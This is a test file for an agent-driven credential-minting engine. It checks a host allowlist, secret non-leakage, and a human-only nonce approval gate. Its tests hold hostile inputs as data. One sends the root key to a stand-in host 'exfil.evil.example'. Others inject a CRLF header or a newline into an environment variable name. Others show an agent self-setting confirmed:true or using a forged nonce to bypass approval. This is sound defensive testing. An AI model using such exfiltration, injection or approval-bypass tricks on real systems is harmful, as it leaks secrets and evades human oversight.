// The GENERIC dynamic mint engine, offline + deterministic against the mock host.
// Drives the ONE executor the way a real agent would author it:
//   set root (vault) → permission-check → mint → value lands in a temp .env.local
//   → NO value leaks in any return → idempotent re-run reuses → non-allowlisted
//   host REJECTED before any HTTP → a {{ROOT}}-using action with no root recovers.
import { afterAll, beforeAll, beforeEach, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { addRoot, listRootsFor, putRoot, readStore, resolveRoot } from "@ringtail/store";
import { hostAllowed } from "./allowlist";
import {
  approveMintAction,
  executeMintAction,
  isConsequential,
  MintActionSchema,
  type MintAction,
  proposeMintAction,
} from "./mint";
import { startMockProvider, type MockProvider } from "./mock-provider";

// The root master key — must reach the allowlisted host, must never appear in a return.
const ROOT = "ROOT-MASTER-KEY-SENTINEL-9999";

let dir: string;
let envLocalPath: string;
let mock: MockProvider;
let opts: { repoName: string; env: "local"; envLocalPath: string };

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "ringtail-mint-"));
  envLocalPath = join(dir, ".env.local");
  mock = startMockProvider();
  process.env.RINGTAIL_HOME = join(dir, "home"); // isolate the vault to a temp dir
  process.env.RINGTAIL_ALLOW_MOCK = "1"; // opt the loopback `mock` host into the allowlist (test-only)
  // bun auto-loads the repo-root .env.local into process.env, which discovery reads
  // first — clear our test var so the "fresh mint then reuse" sequence is hermetic.
  delete process.env.RINGTAIL_MINT_TEST_KEY;
  putRoot("mock", ROOT); // the DASHBOARD paste path, simulated
  // Bind opts AFTER envLocalPath is assigned (a module-level literal would capture
  // the still-undefined value and write to the repo-root .env.local instead).
  opts = { repoName: "krispyai", env: "local", envLocalPath };
});

afterAll(() => {
  mock.stop();
  rmSync(dir, { recursive: true, force: true });
});

beforeEach(() => {
  mock.calls.oauthToken.length = 0;
  mock.calls.validate.length = 0;
  mock.calls.authSeen.length = 0;
});

test("case-insensitive provider: root pasted 'Mock' resolves for 'mock'/'MOCK', allowlist matches any casing", () => {
  putRoot("Mock", ROOT); // paste under mixed case (the vault normalizes the provider segment)
  expect(resolveRoot("mock")).toBe(ROOT); // a lowercase mint finds it
  expect(resolveRoot("MOCK")).toBe(ROOT); // and any casing
  expect(hostAllowed("Mock", "http://localhost/x")).toBe(true); // lowercase-keyed allowlist matches
  expect(hostAllowed("MOCK", "http://127.0.0.1/x")).toBe(true);
  // agency :account suffix casing is preserved (only the provider segment lowercases)
  putRoot("Mock:Client-X", ROOT);
  expect(resolveRoot("mock:Client-X")).toBe(ROOT);
  expect(resolveRoot("mock:client-x")).toBeNull();
});

test("non-allowlisted host is REJECTED before any HTTP (the structural floor)", async () => {
  const action: MintAction = {
    providerAccount: "mock", // provider IS allowlisted…
    method: "POST",
    url: "http://exfil.evil.example/oauth/token", // …but this host is NOT
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "RINGTAIL_MINT_TEST_KEY", path: "token" },
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("rejected");
  expect(r.reason).toContain("not allowlisted");
  // The root key never left: no HTTP call reached the mock, nothing was recorded.
  expect(mock.calls.authSeen).toEqual([]);
  expect(JSON.stringify(r)).not.toContain(ROOT);
});

test("permission-check: a read-only action runs and returns ok, root reached the host", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/validate`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { token: "mock-token-full" }, // probe a known token's scope
    danger: "safe", // read-only → auto-runs, no confirm
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("ok");
  // {{ROOT}} was substituted and the REAL root value reached the allowlisted host.
  expect(mock.calls.authSeen).toContain(`Bearer ${ROOT}`);
  expect(JSON.stringify(r)).not.toContain(ROOT); // …but never came back in the result
});

test("mint: value lands in .env.local, only the NAME comes back, no value leaks", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "RINGTAIL_MINT_TEST_KEY", path: "token" },
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("minted");
  expect(r.varName).toBe("RINGTAIL_MINT_TEST_KEY");

  // The minted value really landed on disk…
  expect(readFileSync(envLocalPath, "utf8")).toContain("RINGTAIL_MINT_TEST_KEY=mock-token-full");
  // …filed under the audit name so it can be found + revoked later.
  expect(readStore().credentials["RINGTAIL_MINT_TEST_KEY"]?.provider).toBe(
    "ringtail/krispyai/local/mock",
  );

  // THE GUARANTEE: neither the root nor the minted value appears in the return.
  const blob = JSON.stringify(r);
  expect(blob).not.toContain(ROOT);
  expect(blob).not.toContain("mock-token-full");
});

test("idempotent: a second identical mint REUSES the existing key (no second HTTP mint)", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "RINGTAIL_MINT_TEST_KEY", path: "token" }, // already minted above
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("reused");
  expect(r.varName).toBe("RINGTAIL_MINT_TEST_KEY");
  // Reuse short-circuits BEFORE any HTTP — the provider was never hit again.
  expect(mock.calls.oauthToken).toEqual([]);
});

test("header injection: a CRLF-in-header action is REJECTED and the root never leaks in the reason", async () => {
  const action: MintAction = {
    providerAccount: "mock", // root IS stored (beforeAll)
    method: "POST",
    url: `${mock.url}/oauth/token`,
    // The agent smuggles a CRLF after {{ROOT}} — substituting the real root would make
    // Bun's Headers ctor throw WITH the root value in the message. We reject first.
    headers: { Authorization: "Bearer {{ROOT}}\r\nX-Exfil: y" },
    body: { grant: "full" },
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("rejected");
  expect(r.reason).toContain("control character");
  expect(mock.calls.authSeen).toEqual([]); // never reached the host
  expect(JSON.stringify(r)).not.toContain(ROOT); // THE GUARANTEE: no root in the return
});

test("approve gate: a DELETE with no danger + no confirm is held (needs-confirm), never runs", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "DELETE", // spends the root destructively — derived as consequential
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    // no `danger`, no `confirmed` — the agent tries to dodge the approve gate
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("needs-confirm");
  expect(mock.calls.authSeen).toEqual([]); // the destructive call never fired
});

test("schema: an extract.varName carrying a newline/= is rejected at the trust boundary", () => {
  const parsed = MintActionSchema.safeParse({
    providerAccount: "mock",
    method: "POST",
    url: "https://api.resend.com/x",
    extract: { varName: "X=1\nBETTER_AUTH_SECRET", path: "token" },
  });
  expect(parsed.success).toBe(false);
});

// ── the unforgeable human-confirm channel for consequential mints ────────────────

test("consequence is DERIVED server-side: every root-spending write is consequential; danger can't downgrade", () => {
  const rootWrite = {
    providerAccount: "mock",
    url: "http://localhost/x",
    headers: { Authorization: "Bearer {{ROOT}}" },
  } as const;
  expect(isConsequential({ ...rootWrite, method: "DELETE" })).toBe(true);
  expect(isConsequential({ ...rootWrite, method: "PUT" })).toBe(true);
  expect(isConsequential({ ...rootWrite, method: "PATCH" })).toBe(true);
  // a {{ROOT}} POST creates/rotates with the root → consequential even if the agent
  // self-declares danger:"safe" (safe can only ESCALATE, never downgrade a write).
  expect(isConsequential({ ...rootWrite, method: "POST", danger: "safe" })).toBe(true);
  // a read-only GET, and a POST that never touches {{ROOT}} (a probe), stay auto-run.
  expect(
    isConsequential({ providerAccount: "mock", url: "http://localhost/x", method: "GET" }),
  ).toBe(false);
  expect(
    isConsequential({
      providerAccount: "mock",
      url: "http://localhost/x",
      method: "POST",
      body: { probe: 1 },
    }),
  ).toBe(false);
});

test("propose gate: a consequential mint is HELD (needs-confirm); an agent `confirmed:true` can't self-approve", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "PROPOSE_HELD_KEY", path: "token" },
  };
  // The agent smuggles confirmed:true — proposeMintAction MUST drop it and still hold.
  const r = await proposeMintAction(action, { ...opts, confirmed: true });
  expect(r.result.status).toBe("needs-confirm");
  expect(r.result.id).toBeTruthy();
  expect(r.pending?.nonce).toBeTruthy();
  // THE nonce never rides back to the agent (only the public id does).
  expect(JSON.stringify(r.result)).not.toContain(r.pending!.nonce);
  // …and nothing executed: the provider was never hit.
  expect(mock.calls.oauthToken).toEqual([]);
});

test("approve gate: only the server nonce (human, out-of-band) executes the parked mint", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "PROPOSE_MINT_KEY", path: "token" },
  };
  const proposed = await proposeMintAction(action, opts);
  expect(proposed.result.status).toBe("needs-confirm");
  const nonce = proposed.pending!.nonce;

  // a forged / unknown nonce never executes.
  const forged = await approveMintAction("not-a-real-nonce");
  expect(forged.status).toBe("rejected");
  expect(mock.calls.oauthToken).toEqual([]);

  // the real server nonce (the human via POST /api/action) DOES execute.
  const approved = await approveMintAction(nonce);
  expect(approved.status).toBe("minted");
  expect(approved.varName).toBe("PROPOSE_MINT_KEY");
  expect(mock.calls.oauthToken.length).toBe(1);

  // the nonce is single-use: a replay is rejected.
  const replay = await approveMintAction(nonce);
  expect(replay.status).toBe("rejected");

  // THE GUARANTEE holds through the approve path: no root, no minted value comes back.
  const blob = JSON.stringify(approved);
  expect(blob).not.toContain(ROOT);
  expect(blob).not.toContain("mock-token-full");
});

test("read-only auto-runs through propose: a non-{{ROOT}} POST probe is not parked", async () => {
  const action: MintAction = {
    providerAccount: "mock",
    method: "POST",
    url: `${mock.url}/validate`,
    body: { token: "mock-token-full" }, // no {{ROOT}} → a probe, not a root-spending write
  };
  const r = await proposeMintAction(action, opts);
  expect(r.pending).toBeUndefined(); // not parked
  expect(r.result.status).toBe("ok"); // ran immediately
  expect(mock.calls.validate.length).toBe(1);
});

test("no-root: a {{ROOT}} action with no stored root recovers, never calls out", async () => {
  const action: MintAction = {
    providerAccount: "mock:other", // allowlisted (provider=mock) but no root stored
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "MOCK_OTHER_KEY", path: "token" },
  };
  const r = await executeMintAction(action, opts);
  expect(r.status).toBe("no-root");
  expect(mock.calls.oauthToken).toEqual([]); // no root → no call
});

// ── multi-root selection guard (PRD §4.4) — the root-choice rides the parked choice flow ──

test("multi-root: a >1-root provider parks a value-free root choice; only a valid rootId spends the CHOSEN root", async () => {
  const ROOT_A = "ROOT-MULTI-A-SENTINEL-aaa";
  const ROOT_B = "ROOT-MULTI-B-SENTINEL-bbb";
  const a = addRoot({ provider: "mock", account: "mr", label: "acct-a", value: ROOT_A });
  addRoot({ provider: "mock", account: "mr", label: "acct-b", value: ROOT_B });
  expect(listRootsFor("mock:mr").length).toBe(2); // two roots for this account → ambiguous

  const template: MintAction = {
    providerAccount: "mock:mr",
    method: "POST",
    url: `${mock.url}/oauth/token`,
    headers: { Authorization: "Bearer {{ROOT}}" },
    body: { grant: "full" },
    extract: { varName: "MULTIROOT_UNIT_KEY", path: "token" },
  };

  // propose → parked with the value-free root menu (labels/ids, NEVER a value).
  const p1 = await proposeMintAction(template, opts);
  expect(p1.result.status).toBe("needs-confirm");
  const offered = p1.pending?.choices?.roots ?? [];
  expect(offered.length).toBe(2);
  expect(offered.map((r) => r.label).toSorted((a, b) => (a ?? "").localeCompare(b ?? ""))).toEqual([
    "acct-a",
    "acct-b",
  ]);
  expect(JSON.stringify(offered)).not.toContain(ROOT_A);
  expect(JSON.stringify(offered)).not.toContain(ROOT_B);

  // approve with NO rootId → rejected (the daemon can't silently pick when several exist).
  const noRoot = await approveMintAction(p1.pending!.nonce);
  expect(noRoot.status).toBe("rejected");
  expect(noRoot.reason).toContain("root selection is required");

  // approve with a FORGED rootId → rejected (must match an enumerated option — a compromised
  // dashboard can't inject an arbitrary root). Fresh propose: a rejected approve burns the nonce.
  const p2 = await proposeMintAction(
    { ...template, extract: { varName: "MULTIROOT_UNIT_KEY_2", path: "token" } },
    opts,
  );
  const forged = await approveMintAction(p2.pending!.nonce, {
    resource: "",
    permission: "",
    rootId: "not-a-real-id",
  });
  expect(forged.status).toBe("rejected");
  expect(forged.reason).toContain("not one of the offered roots");

  // approve with root A's REAL id → minted, and ROOT_A (not ROOT_B) reached the host.
  const p3 = await proposeMintAction(
    { ...template, extract: { varName: "MULTIROOT_UNIT_KEY_3", path: "token" } },
    opts,
  );
  const from = mock.calls.authSeen.length;
  const ok = await approveMintAction(p3.pending!.nonce, {
    resource: "",
    permission: "",
    rootId: a.id,
  });
  expect(ok.status).toBe("minted");
  const used = mock.calls.authSeen.slice(from);
  expect(used).toContain(`Bearer ${ROOT_A}`);
  expect(used).not.toContain(`Bearer ${ROOT_B}`); // spent the CHOSEN root, not its sibling
  // THE GUARANTEE holds through the guard path: no root value comes back.
  const blob = JSON.stringify([p1.result, p3.result, ok]);
  expect(blob).not.toContain(ROOT_A);
  expect(blob).not.toContain(ROOT_B);
});
